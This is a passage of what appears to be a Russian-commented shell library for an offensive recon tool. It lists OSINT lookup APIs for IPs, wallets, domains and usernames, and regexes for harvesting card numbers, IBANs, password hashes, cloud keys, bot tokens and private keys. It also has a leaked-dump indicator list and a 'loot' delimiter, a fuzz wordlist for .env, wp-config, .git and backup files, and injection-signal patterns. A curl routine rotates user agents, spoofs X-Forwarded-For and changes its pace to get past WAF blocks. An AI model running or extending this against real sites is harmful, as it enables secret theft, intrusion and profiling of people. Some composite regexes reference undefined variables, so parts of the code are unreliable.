    "http://ip-api.com/json/{IP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting|GET|JSON|IP|IP-API Co Deep Decoder"
    "https://ipapi.co/{IP}/json/|GET|JSON|IP|IPapi Co Standard Node"
    "https://freeipapi.com/api/json/{IP}|GET|JSON|IP|FreeIPAPI High-Rate Gate"
    
    # --- Трекеры маршрутизации, подсетей и автономных систем (BGP & ASN Intel) ---
    "https://api.bgpview.io/ip/{IP}|GET|JSON|IP|BGPView IP-to-ASN Tracker"
    "https://api.bgpview.io/asn/{ASN}|GET|JSON|ASN|BGPView ASN Infrastructure Core"
    "https://stat.ripe.net/data/network-info/data.json?resource={IP}|GET|JSON|IP|RIPE NCC Regional Internet Registry"
    "https://stat.ripe.net/data/as-overview/data.json?resource={ASN}|GET|JSON|ASN|RIPE NCC ASN Routing Matrix"
)

# ==============================================================================
# 4. КРИПТОГРАФИЧЕСКИЙ ТРЕКИНГ БАЛАНСОВ (ULTIMATE CRYPTO LEDGER INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|БЛОКЧЕЙН_СЕТЬ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {ADDRESS} автоматически заменяется валидным криптокошельком.
GLOBAL_API_CRYPTO_NODES=(
    # --- Bitcoin Сеть (BTC Ledger / UTXO Infrastructure) ---
    "https://blockchain.info/rawaddr/{ADDRESS}|GET|JSON|BTC|BlockchainInfo Public Ledger"
    "https://api.blockcypher.com/v1/btc/main/addrs/{ADDRESS}/balance|GET|JSON|BTC|BlockCypher BTC Node"
    
    # --- Ethereum Сеть (ETH / ERC-20 / EVM RPC Infrastructure) ---
    "https://rpc.ankr.com/eth|POST|JSON|ETH|Ankr EVM High-Performance RPC"
    "https://ethereum-rpc.publicnode.com|POST|JSON|ETH|PublicNode Decentralized EVM Gateway"
    
    # --- TRON Сеть (TRX / TRC-20 / TRON-EVM Infrastructure) ---
    "https://apilist.tronscan.org/api/account?address={ADDRESS}|GET|JSON|TRX|TronScan Core Ledger"
    "https://api.trongrid.io/v1/accounts/{ADDRESS}|GET|JSON|TRX|TronGrid Official Border Node"
)

# ==============================================================================
# 5. ИНТЕЛЛЕКТ ДОМЕННЫХ ИМЕН, DNS И СЕРВЕРОВ (ULTIMATE DOMAIN & DNS INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры {DOMAIN} и {IP} автоматически заменяются сигнатурным ядром.
GLOBAL_API_DOMAIN_NODES=(
    # --- Высокопроизводительные DoH-декодеры (DNS Over HTTPS Core) ---
    "https://dns.google/resolve?name={DOMAIN}&type=ANY|GET|JSON|DOMAIN|Google Secure DoH Core"
    "https://cloudflare-dns.com/dns-query?name={DOMAIN}&type=ANY|GET|DNS_JSON|DOMAIN|Cloudflare Quad1 DoH Gateway"
    
    # --- Проверка регистрационных данных и возраста домена (WHOIS / RDAP) ---
    "https://rdap.org/domain/{DOMAIN}|GET|JSON|DOMAIN|ICANN RDAP International Registry"
    
    # --- Пассивный поиск субдоменов и OSINT сертификатов (Certificate Transparency) ---
    "https://crt.sh/?q={DOMAIN}&output=json|GET|JSON|DOMAIN|COMODO Certificate Transparency Ledger"
    
    # --- Реверсивный DNS-трекинг инфраструктуры (Reverse DNS) ---
    "https://api.viewdns.info/reversedns/?ip={IP}&output=json|GET|JSON|IP|ViewDNS Infrastructure Matrix"
)

# ==============================================================================
# 6. МЕТАДАННЫЕ, СОЦСЕТИ И ПОИСК СВЯЗЕЙ (ULTIMATE SOCIAL IDENTITY INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {USER} автоматически заменяется очищенным никнеймом или идентификатором.
GLOBAL_API_IDENTITY_NODES=(
    # --- Профессиональный и разработческий цифровой след (Dev Intel) ---
    "https://api.github.com/users/{USER}|GET|JSON|USER|GitHub Developer Core API"
    "https://api.github.com/users/{USER}/events/public|GET|JSON|USER|GitHub Public Activity Tracker"
    
    # --- Архивный цифровой след и история изменений (Wayback Machine) ---
    "https://archive.org/advancedsearch.php?q=creator%3A%22{USER}%22&output=json|GET|JSON|USER|Wayback Machine Meta-Archive"
    "https://web.archive.org/cdx/search/cdx?url=*.{USER}*&output=json&limit=50|GET|JSON|DOMAIN|Wayback Machine URL Indexer"
    
    # --- Публичные метаданные мессенджеров и платформ (Public Web OSINT) ---
    "https://t.me/s/{USER}|GET|HTML|USER|Telegram Channel/Profile Web Stream"
    "https://boards-api.greenhouse.io/v1/boards/{USER}/jobs|GET|JSON|USER|Greenhouse Corporate Job Boards"
)


# ==============================================================================
# @matrix: GLOBAL_EMAIL_MATRIX v1.0
# @description: Единая сигнатурная матрица валидации почтовых аккаунтов
# ==============================================================================
GLOBAL_EMAIL_MATRIX=(
    # [0] Универсальный RFC-адаптированный паттерн (Регистронезависимая латиница)
    '\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,63}\b'
    
    # [1] Интернациональные почтовые адреса (IDN / Сервера в Punycode-зонах xn--)
    '\b[a-zA-Z0-9._%+-]+@([a-zA-Z0-9-]+\.)*xn--[a-zA-Z0-9-]{1,59}\b'
    
    # [2] Системные, контейнерные и локальные адреса внутренней инфраструктуры
    '\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(local|lan|internal|domain|node)\b'
)

# ==============================================================================
# @matrix: GLOBAL_PRIME_MATRIX v2.0
# @description: Единая матрица поискового реестра телефонов (Заменила GLOBAL_PHONE_MATRIX)
# АРХИТЕКТУРА: Полная совместимость с POSIX ERE (AWK, grep -E) | Границы \b изолированы
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | ZERO-DUPLICATION
# ==============================================================================
GLOBAL_PRIME_MATRIX=(
    # [0] Международные форматы (E.164 и аналоги с опциональными разделителями)
    '\b\+[0-9]{1,3}[[:space:]\.-]?[0-9]{3,4}[[:space:]\.-]?[0-9]{2,4}[[:space:]\.-]?[0-9]{2,4}\b'
    
    # [1] Форматы со скобками (Локальные, городские и региональные узлы связи)
    '\b\(?[0-9]{2,5}\)?[[:space:]\.-]?[0-9]{2,5}[[:space:]\.-]?[0-9]{2,5}[[:space:]\.-]?[0-9]{2,4}\b'
    
    # [2] Форматы с ведущим 8 или 7 (Специфика СУБД и логов стран СНГ)
    '\b[87][[:space:]\.-]?[0-9]{3}[[:space:]\.-]?[0-9]{3}[[:space:]\.-]?[0-9]{2}[[:space:]\.-]?[0-9]{2}\b'
    
    # [3] Компактные форматы (Сырые числовые последовательности, биллинги, без разделителей)
    # Жестко изолирован границами слова для исключения перехвата Unix-timestamp и ID
    '\b[0-9]{7,15}\b'
)

# ==============================================================================
# ЕДИНАЯ МАТРИЦА PRIME (ИНФРАСТРУКТУРНЫЙ РЕЕСТР - ULTIMATE EDITION)
# ==============================================================================
GLOBAL_INFRA_MATRIX=(
    # --- 1. IPv4 (стандарт + CIDR) ---
    '\b((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(/[0-9]{1,2})?\b'
    
    # --- 2. IPv6 (полный стек: сжатые, полные, с CIDR, в скобках) ---
    '\b(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))(/[0-9]{1,3})?\b'
    
    # --- 3. Домены (IDN, TLD, Subdomains, включая локальные .local/.lan) ---
    '\b([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,63}\b'
    '\b(xn--[a-zA-Z0-9-]{1,59})\b'
)



# ==============================================================================
# @description: ГЛОБАЛЬНЫЙ ФИНАНСОВЫЙ СЛОЙ (INTERNATIONAL BANKING PATTERNS)
# МОДЕРНИЗАЦИЯ: Добавлены стандарты для международных и специфических операций
# ==============================================================================
# ==============================================================================
# ЕДИНЫЙ ФИНАНСОВЫЙ РЕЕСТР PRIME (ULTIMATE FINANCIAL SIGNATURES)
# ==============================================================================
GLOBAL_FINANCE_MATRIX=(
    # --- 1. IBAN (ISO 13616: Универсальный) ---
    # Учтены все пробельные символы и разделители
    '\b[A-Z]{2}[0-9]{2}([[:space:]\.-]?[A-Z0-9]){10,30}\b'
    
    # --- 2. SWIFT/BIC (Международный) ---
    '\b[A-Z]{4}[A-Z]{2}[A-Z0-9]{2}([A-Z0-9]{3})?\b'
    
    # --- 3. RIB / FR BANK ACCOUNT (Специфика Франции) ---
    # Код банка (5), код отделения (5), номер счета (11), ключ RIB (2)
    '\b[0-9]{5}[[:space:].-]?[0-9]{5}[[:space:].-]?[a-zA-Z0-9]{11}[[:space:].-]?[0-9]{2}\b'
    
    # --- 4. BBAN (Basic Bank Account Number) ---
    # Расширенный охват: от 10 до 34 символов для международного использования
    '\b[A-Z0-9]{10,34}\b'
    
    # --- 5. CREDIT/DEBIT CARDS (Luhn-Ready Detection) ---
    # Поиск номеров карт (Visa, Mastercard, Amex, и др. от 13 до 19 цифр)
    '\b[0-9]{4}([[:space:].-]?[0-9]{4}){2,3}([[:space:].-]?[0-9]{1,3})?\b'
    
    # --- 6. КРИПТО-АДРЕСА (Дополнительный финансовый уровень) ---
    # Bitcoin (Legacy P2PKH и SegWit), Ethereum (0x...)
    '\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}|0x[a-fA-F0-9]{40})\b'
)


# Сигнатурный разделитель метаданных в системных логах (Loot Splitting Pattern)
GLOBAL_REGEX_BRIDGE_DELIMITER=" -> "


GLOBAL_ENTITY_MATRIX=(
    # [0] Регистрационные номера компаний (Франция - SIREN/SIRET)
    '\b[0-9]{3}[[:space:].-]?[0-9]{3}[[:space:].-]?[0-9]{3}([[:space:].-]?[0-9]{5})?\b'
    # [1] VAT (НДС) номера Евросоюза
    '\b[A-Z]{2}[0-9]{2,12}\b'
    # [2] LEI (Legal Entity Identifier) - глобальный код идентификации юрлиц
    '\b[A-Z0-9]{4}00[A-Z0-9]{12}[0-9]{2}\b'
)

# Инфраструктурные матрицы (используем публичные API без API-KEY)
GLOBAL_INFRA_HIDDEN_MATRIX=(
    "https://api.viewdns.info/reverseip/?host=%IP%&output=json|API|NET|Reverse IP Infrastructure"
    "https://api.securitytrails.com/v1/history/%DOMAIN%/dns/a|API|DNS|SecurityTrails History"
)

GLOBAL_DUMP_INDICATORS=(
    # Идентификатор дампа (часто встречается в заголовках файлов или именах папок)
    '\b(combo|db|dump|leaked|private|fullz|userpass)\.txt\b'
    # Специфические для Telegram форматы пересылки дампов
    '\b(tg://privatepost/|t\.me/c/[0-9]+/)\b'
)


GLOBAL_API_FRAUD_NODES=(
    "https://api.gravatar.com/v3/profiles/%EMAIL_HASH%|GET|JSON|USER|Gravatar Profile Intel"
)




# ==============================================================================
# 12. МАТРИЦА ЛЕГИТИМНЫХ ОКРУЖЕНИЙ И USER-AGENTS (ULTIMATE UA ROTATOR)
# ==============================================================================
GLOBAL_NETWORK_UA=(
    # --- Windows 11 / Современные браузеры (Corporate Desktop Standard) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Edge/124.0.0.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
    
    # --- macOS / Apple экосистема (Premium Consumer Segment) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
    
    # --- Linux / Профессиональные рабочие станции (Developer/Sysadmin Trace) ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    
    # --- Мобильный трафик (Mobile Mesh / High-Trust Bypassing) ---
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/605.1.15"
)



# ==============================================================================
# ГЛОБАЛЬНАЯ МАТРИЦА СЕТЕВЫХ ОТПЕЧАТКОВ И ЛОКАЛИЗАЦИЙ (NEXUS MATRIX POOL v25.7)
# ==============================================================================
GLOBAL_LANG_POOL=(
    "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
    "en-US,en;q=0.9,fr;q=0.7,de;q=0.5"
    "en-GB,en;q=0.9,en-US;q=0.8,de;q=0.6"
    "es-ES,es;q=0.9,en;q=0.7,ca;q=0.5"
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.6"
    "it-IT,it;q=0.9,en;q=0.7,el;q=0.5"
)

GLOBAL_ENC_POOL=(
    "gzip, deflate, br, zstd"
    "gzip, deflate, br"
    "gzip, deflate"
)

GLOBAL_BASE_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"

# Системный массив для выявления утечек заголовков серверной инфраструктуры
GLOBAL_HTTP_MATRIX=("X-Powered-By" "Server" "X-AspNet-Version" "X-Runtime" "X-Version" "Via" "X-Cache")



generate_matrix_arguments() {
    local target_ip="$1"
    local target_host="$2"

    # --- АДАПТИВНЫЙ КОНТРОЛЛЕР ---
    # Принудительно приводим к целому числу, игнорируя ошибки
    local raw_count=0
    [[ -f "/tmp/recon_hits_$$" ]] && raw_count=$(grep -c "WAF_BLOCK" "/tmp/recon_hits_$$" 2>/dev/null || echo 0)
    
    # Очистка от любых символов кроме цифр
    local block_count=${raw_count//[^0-9]/}
    [[ -z "$block_count" ]] && block_count=0
    
    # Использование [ ] вместо (( )) для максимальной совместимости
    local mode=0
    if [ "$block_count" -gt 8 ]; then
        mode=2
    elif [ "$block_count" -gt 3 ]; then
        mode=1
    fi

    # --- ГЕНЕРАЦИЯ ПРОФИЛЯ ---
    # Безопасный выбор элемента массива (с учетом индексации zsh/bash)
    local len=${#GLOBAL_NETWORK_UA[@]}
    local idx=$(( (RANDOM % len) + 1 ))
    local r_ua="${GLOBAL_NETWORK_UA[$idx]}"
    [[ -z "$r_ua" ]] && r_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

    # --- АДАПТАЦИЯ ЗАГОЛОВКОВ ---
    local p_mobile="?0"
    local p_platform="\"Windows\""
    if [[ "$r_ua" =~ "iPhone" || "$r_ua" =~ "Android" ]]; then
        p_mobile="?1"
        p_platform="\"Android\""
    fi

    # --- СБОРКА МАТРИЦЫ ---
    CURL_MATRIX_ARGS=(
        -A "$r_ua"
        --http1.1
        -H "Accept: $GLOBAL_BASE_ACCEPT"
        -H "Referer: https://$target_host/"
        -H "Connection: close"
        -H "Sec-Fetch-Site: same-origin"
        -H "X-Forwarded-For: $target_ip"
        -H "DNT: 1"
    )

    # Используем [ "$mode" -lt 2 ] для проверки уровня защиты
    if [ "$mode" -lt 2 ]; then
        CURL_MATRIX_ARGS+=(-H "Sec-Ch-Ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"")
        CURL_MATRIX_ARGS+=(-H "Sec-Ch-Ua-Mobile: $p_mobile")
        CURL_MATRIX_ARGS+=(-H "Sec-Ch-Ua-Platform: $p_platform")
    fi

    # --- АДАПТИВНОЕ УПРАВЛЕНИЕ ТЕМПОМ ---
    # Обычный арифметический подстановочный блок
    local pause=$(( 1 + (mode * 3) + (RANDOM % 3) ))
    echo "$pause" > /tmp/current_adaptive_delay
}


# ==============================================================================
# МАТРИЦЫ ДЛЯ АНАЛИЗА ИНФРАСТРУКТУРЫ И АРТЕФАКТОВ (INFRASTRUCTURE & STATIC CORE)
# ==============================================================================

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР АРТЕФАКТОВ И ХОСТИНГ-ОКРУЖЕНИЯ (ARTIFACT-CORE-NEXUS: ULTIMATE)
# ==============================================================================
GLOBAL_ARTIFACT_MATRIX=(
    # --- 1. Конфигурационные секреты и дампы (Высокий приоритет) ---
    '\.(env|bak|sql|sql\.gz|htaccess|git/config|conf|key|pem|htpasswd|old|swp|db|sqlite|log|ini|json|ya?ml|env\.example|docker-compose\.yml|credentials|config\.php)\b'
    
    # --- 2. Веб-артефакты и медиа-контейнеры ---
    '\b[a-zA-Z0-9_\/\.-]+\.(php[0-9]?|aspx?|jspx?|pdf|docx?|xlsx?|zip|tar\.gz|tgz|rar|7z|sql)\b'
    
    # --- 3. Исполняемые и скомпилированные векторы ---
    '\.(php[0-9]?|phtml|phar|aspx?|ashx|asmx|axd|jspx?|do|cgi|pl|pyc?|rb|sh|bat|cmd|go|rs|js|ts|dll|so|exe|bin|elf)$'
    
    # --- 4. Инфраструктурный мусор (Анти-шумовой фильтр) ---
    # Добавлены паттерны заголовков ответов и сигнатуры хостинг-панелей
    '(40[0-9]|50[0-9])[[:space:]]+(Forbidden|Not Found|Bad Request|Unauthorized|Bad Gateway|Internal Server Error|Service Unavailable)'
    '(InfinityFree|Hostinger|Cloudflare|Cloudfront|Sucuri|Incapsula|Under Construction|Powered by cPanel|Plesk|Welcome to nginx|Apache/|LiteSpeed|IIS/|Tomcat|Jetty|WebSphere|Phusion Passenger|X-Powered-By:|Server:)'
    
    # --- 5. Скрытые административные артефакты ---
    '\b(adminer|phpmyadmin|wp-admin|dashboard|cpanel|webmail|composer\.json|package\.json|node_modules|vendor|__pycache__)\b'
)

# ==============================================================================
# 5. СЛОВАРЬ ФАЗЗИНГА ЧУВСТВИТЕЛЬНЫХ ТОЧЕК И АРТЕФАКТОВ (ULTIMATE FUZZ WORDLIST)
# ==============================================================================
GLOBAL_FUZZ_WORDLIST=(
    # --- Ядро окружения и секреты (Environment & Secrets) ---
    ".env"
    ".env.local"
    ".env.production"
    ".env.stage"
    ".env.bak"
    ".env.old"
    "config.env"
    
    # --- Конфигурации и Веб-серверы (Configurations & Web Servers) ---
    ".htaccess"
    ".htpasswd"
    "web.config"
    "nginx.conf"
    "config.php"
    "config.inc.php"
    "config.json"
    "wp-config.php"
    "wp-config.bak"
    "configuration.php"
    "settings.py"
    "application.properties"
    "application.yml"
    
    # --- Репозитории и CI/CD оркестрация (Repositories & CI/CD) ---
    ".git/HEAD"
    ".git/config"
    ".git/index"
    ".gitignore"
    ".svn/entries"
    "docker-compose.yml"
    "Dockerfile"
    ".gitlab-ci.yml"
    "jenkins.xml"
    "package.json"
    
    # --- Дампы баз данных и бэкапы (Database Dumps & Backups) ---
    "backup.sql"
    "database.sql"
    "dump.sql"
    "db.sql"
    "mysql.sql"
    "data.sqlite"
    "backup.zip"
    "backup.tar.gz"
    "backup.rar"
    "site.zip"
    "www.zip"
    "html.zip"
    "archive.zip"
    "config.php.bak"
    "config.php.old"
    "index.php.bak"
    "index.php.old"
    
    # --- Логи и Отладка (Logs, Debugging & Panel Entrances) ---
    "phpinfo.php"
    "info.php"
    "test.php"
    "debug.log"
    "error.log"
    "access.log"
    "laravel.log"
    "pm2.log"
    "cron.log"
    "status"
    "server-status"
)

# ==============================================================================
# @description: Ультимативные сигнатуры для статического анализа (PE/ELF/Logs)
# ==============================================================================
GLOBAL_STATIC_SIGNATURES="(https?|ftp|sftp|ws|wss):\/\/[^\s\"'\`>]+|\/etc\/(passwd|shadow|issue|hostname|resolv\.conf)|\/proc\/(self|net|version)|\b(cmd\.exe|powershell\.exe|sh|bash|zsh|csh|tcsh|wscript\.exe|cscript\.exe|rundll32\.exe|regsvr32\.exe)\b|\b(Authorization|Bearer|X-API-Key|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|token|secret_key|api_key|passwd|password|private_key|id_rsa|ssh-rsa)\b|VirtualAlloc|VirtualProtect|IsDebuggerPresent|CheckRemoteDebuggerPresent|GetProcAddress|LoadLibraryA|system|execve|popen|fork"

# --- Расширенные сигнатуры глубокого анализа (Deep Forensics & OSINT RegEx) ---
# ==============================================================================
# @description: Ультимативный паттерн для потокового поиска пар email:pass и login:pass
# МОДЕРНИЗАЦИЯ: Исправлен синтаксис (удален (?i)), адаптирован под POSIX ERE
# ==============================================================================
GLOBAL_HASH_MATRIX=(
    # --- 1. MD5 / CRC32 (32 символа) ---
    '\b[a-fA-F0-9]{32}\b'
    # --- 2. SHA-1 / RIPEMD-160 (40 символов) ---
    '\b[a-fA-F0-9]{40}\b'
    # --- 3. SHA-256 (64 символа) ---
    '\b[a-fA-F0-9]{64}\b'
    # --- 4. SHA-512 (128 символов) ---
    '\b[a-fA-F0-9]{128}\b'
    # --- 5. Windows NTLM / LM-Hash ---
    '\b[0-9a-fA-F]{32}:[0-9a-fA-F]{32}\b'
    '\b[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}\b'
    # --- 6. Контекстные маркеры ---
    '\b(md5|sha1|sha256|sha512|password_hash|wp_|user_pass|pwd|hash|secret|token)[[:space:]]*[:=]{1,2}[[:space:]]*[a-fA-F0-9]{32,128}\b'
    # --- 7. SQL-контекст ---
    '\b(VALUES|SET|WHERE)[[:space:]]+[\x27\x22]{0,1}[a-fA-F0-9]{32,128}[\x27\x22]{0,1}\b'

    # --- 8. УСИЛЕНИЕ: Структуры данных (JSON/XML) ---
    '\"(password|pwd|hash|secret|token)\"[[:space:]]*:[[:space:]]*\"[a-fA-F0-9]{32,128}\"'
    '<[^>]+>(password|pwd|hash|secret|token)<\/[^>]+>[[:space:]]*[a-fA-F0-9]{32,128}'
    
    # --- 9. УСИЛЕНИЕ: Переменные окружения и конфиги ---
    '\b(DB_PASSWORD|APP_SECRET|API_KEY|CLIENT_SECRET|PRIVATE_KEY)[[:space:]]*[:=]{1,2}[[:space:]]*[\x27\x22]{0,1}[A-Za-z0-9\-_]{20,}[\x27\x22]{0,1}\b'
    
    # --- 10. УСИЛЕНИЕ: "Hardcoded" пароли в коде (assigns) ---
    # Ищет конструкции типа password = '...' или secret = "..."
    '\b(password|pwd|secret|key|access_token)[[:space:]]*=[[:space:]]*[\x27\x22][a-zA-Z0-9!@#$%^&*()_+]{8,32}[\x27\x22]'

    # AWS Access Key ID
    '\bAKIA[0-9A-Z]{16}\b'
    # Google Service Account Private Key ID
    '\b[0-9a-fA-F]{40}\b'
    # Azure Storage Account Key
    '\b[a-zA-Z0-9+/]{86}==\b'

# SSH Private Key Header
'-----BEGIN[[:space:]]+[A-Z[:space:]]+PRIVATE[[:space:]]+KEY-----'
# RSA/ECC Private Key
'-----BEGIN[[:space:]]+(RSA|EC|DSA|OPENSSH)[[:space:]]+PRIVATE[[:space:]]+KEY-----'

# Telegram Bot Token
'\b[0-9]{8,15}:[A-Za-z0-9_-]{35}\b'
# Discord Bot Token
'\b[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}\b'

# --- 11. УСИЛЕНИЕ: Абсолютный захват (От 1 символа до предела) ---
    # ВАЖНО: При использовании этого правила в Flask, 
    # рекомендуется использовать его с осторожностью, 
    # чтобы не получить слишком много ложноположительных результатов.
    '\b[A-Za-z0-9!@#$%^&*()_+]{1,}\b'
)

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР КРИПТОГРАФИИ И СЕРВИСНЫХ КЛЮЧЕЙ (CRYPTO-NEXUS: ULTIMATE)
# ==============================================================================
GLOBAL_CRYPTO_MATRIX=(
    # --- 1. SHA-256 (64 символа) & SHA-512 (128 символов) ---
    '\b[a-fA-F0-9]{64}\b'
    '\b[a-fA-F0-9]{128}\b'
    
    # --- 2. Контекстные секреты (Расширенные маркеры) ---
    '\b(private_key|secret|wallet|priv|privkey|signing|password|passwd|apiKey|accessToken)[[:space:]]*[:=]{1,2}[[:space:]]*[A-Za-z0-9+/=_-]{20,}\b'
    
    # --- 3. Токены мессенджеров и систем ---
    '\b[0-9]{8,15}:[A-Za-z0-9_-]{35}\b'                                  # Telegram
    '\b[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}\b'         # Discord
    '\b[a-fA-F0-9]{32,64}\.slack\.com\b'                                 # Slack Webhooks
    
    # --- 4. JWT & OAuth (RFC 7519 + ID Tokens) ---
    '\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b'
    
    # --- 5. Cloud & Infrastructure Secrets ---
    '\bAKIA[A-Z0-9]{16}\b'                                               # AWS Access Key
    '\bAIza[0-9A-Za-z-_]{35}\b'                                          # Google API Key
    '\b(ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36}\b'                         # GitHub Personal Access Token
    
    # --- 6. RSA / PKCS / SSH Key Headers ---
    '-----BEGIN[[:space:]]+[A-Z[:space:]]+PRIVATE[[:space:]]+KEY-----'
)

# ==============================================================================
# --- 3. ГЛОБАЛЬНЫЕ СУПЕР-КОМПОЗИТЫ (ОПТИМИЗАЦИЯ ПОТОКА) ---
# ==============================================================================
# Проверка одного супер-композита в цикле заменяет собой пачку раздельных проверок

# Объединенный крипто-след (MD5 / NTLM / SHA-256 / Private Keys)
GLOBAL_SUPER_REGEX_CRYPTO="($GLOBAL_REGEX_HASH_32_HEX|$GLOBAL_REGEX_HASH_SHA256)"

# Объединенный шлюз инфраструктурных доступов (JWT / Telegram Bot API)
GLOBAL_SUPER_REGEX_TOKENS="($GLOBAL_REGEX_TG_TOKEN|$GLOBAL_REGEX_JWT)"

# Объединенный сетевой стек (IPv4 / IPv6 / MAC / Domain)
# Настраивается путем слияния твоих базовых сетевых регулярных выражений
GLOBAL_SUPER_REGEX_INFRA="($GLOBAL_REGEX_IP|$GLOBAL_REGEX_MAC|$GLOBAL_REGEX_DOMAIN)"

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР СИСТЕМНОЙ БЕЗОПАСНОСТИ И ЭВРИСТИКИ (SIG-NEXUS: ULTIMATE FULL)
# ==============================================================================
GLOBAL_SECURITY_MATRIX=(
    # --- 6. Сигналы WAF и CDN (Infrastructure Fingerprinting) ---
    '\b(cloudflare|akamai|sucuri|incapsula|imperva|f5_big-ip|mod_security|fortigate|wordfence|aws-waf|cloudfront|fastly|__cfuid|cf-ray|x-sucuri-id|x-protected-by|x-waf-|429[[:space:]]+too[[:space:]]+many[[:space:]]+requests|security_challenge|waf-bypass|block-code|threat-score)\b'
    
    # --- 7. Сигналы структуры SQL/NoSQL/API (Injection Vectors) ---
    '\b(id|uid|uuid|page|category|product|action|query|token_id|hash|payload|graphql|mutation|schema|db_user)\b[[:space:]]*[:=]'
    '\b(select|insert|update|delete|drop|union|load_file|benchmark|sleep|concat|exec|xp_cmdshell|declare|fetch)\b'
    '\b(UNION[[:space:]]+SELECT|ORDER[[:space:]]+BY|GROUP[[:space:]]+BY|HAVING)\b'
    '/api/(v[0-9]|v1|v2|v3|graphql)/[a-zA-Z0-9_-]+/[0-9]+'
    
    # --- 8. Сигналы аномалий, CVE и эксплуатации (Расширенный) ---
    '\b(vulnerable|rce_triggered|shell_spawned|unauthenticated|auth_bypass|sql_error|syntax_error|fatal_error|null_pointer|stack_trace|debug_mode|hidden_config|missing|exposed|weak)\b|\bcve-[0-9]{4}-[0-9]{4,7}\b|\b(lfi|rfi|ssrf|xxe|command_injection|path_traversal|eval\(|base64_decode|system\(|passthru\(|exec\()\b'
    
    # --- 9. Сигналы рантаймов и контейнеризации (Runtime Profiling) ---
    '\b(python[0-9.]*|node[0-9]*|php-fpm[0-9.]*|go|ruby|java|perl|nginx|apache[0-9]?|httpd|gunicorn|docker|podman|containerd|kubelet|uvicorn|daphne|hypercorn)\b'
    
